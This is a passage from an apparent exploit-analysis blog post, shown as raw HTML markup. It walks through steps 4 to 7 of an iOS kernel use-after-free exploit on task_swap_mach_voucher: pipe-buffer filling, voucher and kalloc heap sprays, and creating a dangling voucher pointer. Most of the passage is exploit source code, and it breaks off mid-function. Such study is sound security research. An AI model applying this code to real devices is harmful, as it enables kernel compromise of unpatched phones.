    		&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipefds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    		&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;written&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;written&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// This is most likely because we've run out of pipe buffer memory. None of&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// the subsequent writes will work either.&lt;/span&gt;
    			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;pipes_filled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipes_filled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As we can see from Step 4, the &lt;strong&gt;iterate_ipc_ports&lt;/strong&gt; basically considers the data as &lt;strong&gt;ipc_port&lt;/strong&gt; structs and has a callback function specifying the port offset which is used to set the attributes of the ports.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;cm&quot;&gt;/*
     * iterate_ipc_ports
     *
     * Description:
     * 	A utility function to help iterate over data as an array of ipc_port structs in zalloc
     * 	blocks.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;iterate_ipc_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Iterate through each block.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLOCK_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLOCK_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// Iterate through each port in this block.&lt;/span&gt;
    		&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COUNT_PER_BLOCK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COUNT_PER_BLOCK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLOCK_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLOCK_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The callback function is used to update the pipe buffer and overwrite it with &lt;strong&gt;ipc_port&lt;/strong&gt; structs.&lt;/p&gt;

&lt;h4 id=&quot;step-5-spray-the-heap-with-vouchers&quot;&gt;Step 5: Spray the Heap with Vouchers&lt;/h4&gt;

&lt;p&gt;Next, we spray the heap with Vouchers. And also choose one voucher port that will be eventually freed and call it &lt;strong&gt;uaf_voucher_port&lt;/strong&gt;. As discussed in the previous article, memory is taken from the zone map in blocks. The size of a block is fixed for a particular object for a particular version (&lt;strong&gt;0x4000&lt;/strong&gt; for &lt;strong&gt;ipc_voucher&lt;/strong&gt; for &lt;strong&gt;iPhone11,8 16C50&lt;/strong&gt;). Since the voucher size is also fixed (&lt;strong&gt;0x50&lt;/strong&gt;), the number of voucher objects in a block is also fixed (&lt;strong&gt;0x4000/0x50 = 80&lt;/strong&gt;) The idea is to allocate extra blocks where the voucher that we will free eventually (&lt;strong&gt;uaf_voucher_port&lt;/strong&gt;) will be stored. The first &lt;strong&gt;300&lt;/strong&gt; vouchers are basically to fill up the initial holes. And then we spray vouchers to take up about &lt;strong&gt;16&lt;/strong&gt; blocks, where we plan to put our freed voucher in the target block (Block 7-10). These blocks will then be used for overlapping with OOL port pointers as we will see later.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 5\. Spray IPC vouchers. After we trigger the vulnerability to get a dangling voucher&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// pointer, we can trigger zone garbage collection and get them reallocated with our OOL&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// ports spray.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Assume we'll need 300 early vouchers, 6 transition blocks, 4 target block, and 6 late&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// blocks.&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher_spray_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;COUNT_PER_BLOCK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uaf_voucher_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher_spray_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;COUNT_PER_BLOCK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher_spray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher_spray_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;created %zu vouchers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher_spray_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uaf_voucher_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-6-more-spraying&quot;&gt;Step 6: More Spraying&lt;/h4&gt;

&lt;p&gt;Next, we spray some more memory using the ports we created earlier. This can be later freed to prompt garbage collection. If you remember we had created filler ports and bumped the queue limit on the first &lt;strong&gt;2000&lt;/strong&gt; ports. In this case, the first &lt;strong&gt;500&lt;/strong&gt; ports are being used for spraying again.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 6\. Spray 15% of memory (400MB on the iPhone XR) in kalloc.1024 that we can free later to&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// prompt gc. We'll reuse some of the early ports from the port spray above for this.&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gc_spray_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;platform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memory_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gc_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filler_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gc_port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;// Use at most 500 ports for the spray.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;sprayed_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalloc_spray_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gc_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gc_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;768&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gc_spray_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sprayed %zu bytes to %zu ports in kalloc.%u&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sprayed_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gc_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-7-store-a-pointer-to-the-voucher-but-release-the-reference&quot;&gt;Step 7: Store a pointer to the voucher but release the reference&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 7\. Stash a pointer to an ipc_voucher in the thread's ith_voucher field and then remove&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// the added reference. That way, when we deallocate the voucher ports later, we'll be left&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// with a dangling voucher pointer in ith_voucher.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_set_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;voucher_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uaf_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stashed voucher pointer in thread&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The reference is then released by the &lt;strong&gt;voucher_release&lt;/strong&gt; function. Actually, @_bazad created two similar functions for releasing a reference (&lt;strong&gt;voucher_release&lt;/strong&gt;) and leaking a reference (&lt;strong&gt;voucher_reference&lt;/strong&gt;) which are both wrappers over &lt;strong&gt;voucher_tweak_references&lt;/strong&gt; which is a wrapper over &lt;strong&gt;task_swap_mach_voucher&lt;/strong&gt;. As you remember, the vulnerability was in calling the function &lt;strong&gt;task_swap_mach_voucher()&lt;/strong&gt; which takes as input the current task, a new voucher (reference will be released) and and old voucher (reference will be leaked). Hence if you want to release a reference for a voucher, just pass it as an argument instead of the new voucher and the old voucher can be set as &lt;strong&gt;MACH_PORT_NULL&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;cm&quot;&gt;/*
     * voucher_reference
     *
     * Description:
     * 	Add a reference to the voucher represented by the voucher port.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;voucher_reference&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;voucher_tweak_references&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*
     * voucher_release
     *
     * Description:
     * 	Release a reference on the voucher represented by the voucher port.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;voucher_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;voucher_tweak_references&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*
     * voucher_tweak_references
     *
     * Description:
     * 	Use the task_swap_mach_voucher() vulnerabilities to modify the reference counts of 2
     * 	vouchers.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;voucher_tweak_references&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;release_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reference_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Call task_swap_mach_voucher() to tweak the reference counts (two bugs in one!).&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inout_voucher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reference_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
